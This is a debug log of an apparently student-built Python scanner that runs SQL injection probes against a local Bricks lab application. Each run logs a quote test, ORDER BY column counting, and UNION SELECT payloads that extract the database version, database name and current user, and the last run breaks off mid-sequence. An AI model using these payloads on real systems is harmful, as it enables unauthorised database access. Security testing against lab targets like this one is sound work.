INFO [2022-05-26 09:46:38,786] root 184317 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 13:53:47,925] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,929] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,932] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,936] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,939] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,941] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,945] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,947] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,950] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,952] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,954] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:53:47,957] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,959] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 13:53:47,963] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,965] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:47,968] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,971] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:47,973] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,976] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:47,979] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,981] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:47,985] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,990] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:47,993] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:47,996] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:48,000] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,003] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:48,006] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,008] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:53:48,014] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,017] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 13:53:48,029] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,033] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,040] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,042] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,049] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,052] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,059] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,062] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,068] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,071] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,077] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,079] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,088] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,092] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:53:48,100] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:53:48,103] urllib3.connectionpool 398602 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 13:54:43,066] root 398836 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 13:54:43,426] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,452] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 13:54:43,455] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,458] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 13:54:43,462] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,465] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 13:54:43,468] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,471] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 13:54:43,475] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,478] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,482] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,485] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,489] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,494] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,499] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,502] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,506] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,508] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,510] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,513] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,516] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,518] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,521] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,523] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:54:43,525] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,527] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 13:54:43,532] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,535] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,537] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,540] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,542] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,545] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,549] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,552] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,556] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,560] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,564] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,567] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,573] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,576] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,578] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,582] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 13:54:43,585] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,588] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 13:54:43,599] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,602] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,609] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,612] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,622] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,625] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,634] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,636] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,643] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,646] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,653] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,656] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,662] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,665] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 13:54:43,671] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:54:43,673] urllib3.connectionpool 398836 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 13:57:31,957] root 399404 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 13:57:32,285] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,312] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 13:57:32,316] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,320] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 13:57:32,324] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,327] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 13:57:32,331] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,334] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 13:57:32,339] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,342] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:57:32,346] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,349] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:57:32,353] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,357] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:57:32,360] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,364] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:57:32,368] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 13:57:32,371] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 13:57:32,375] urllib3.connectionpool 399404 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
